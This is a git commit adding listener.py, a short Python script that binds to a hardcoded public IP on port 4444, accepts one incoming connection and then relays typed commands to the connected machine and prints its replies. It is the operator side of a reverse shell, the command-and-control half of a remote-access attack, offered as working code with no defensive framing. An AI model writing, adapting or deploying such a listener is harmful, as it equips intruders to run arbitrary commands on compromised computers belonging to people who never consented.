3fd1f943ac3e316dea7e6b413a89590b77f0a057
pyalchy1 <91168738+pyalchy1@users.noreply.github.com>
2022-01-01 04:25:09 -0500

    Create listener.py

---
+++ listener.py
@@ -0,0 +1,24 @@
+import socket
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("\n[+] Listening For Incoming Connections\n")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def execute_remotely(self, command):
+        self.connection.send(command.encode())
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remotely(command)
+            print(result.decode('utf-8'))
+
+my_listener = Listener("45.84.0.35", 4444)
+my_listener.run()
